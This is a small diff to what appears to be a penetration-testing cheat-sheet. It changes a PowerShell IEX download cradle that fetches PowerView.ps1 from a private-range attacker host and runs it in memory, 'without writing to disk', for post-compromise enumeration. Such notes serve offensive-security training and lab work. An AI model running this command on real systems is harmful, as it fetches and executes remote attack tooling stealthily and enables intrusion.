@@ -13,7 +13,7 @@ coverY: 0
 IEX (Run program remotely — Does not write to disk)
 
 ```python
-IEX(New-Object Net.WebClient).downloadString('<http://10.10.10.123/ps/PowerView.ps1>')
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.17/PowerView.ps1')
 ```
 
 ## Post-Compromise Enumeration
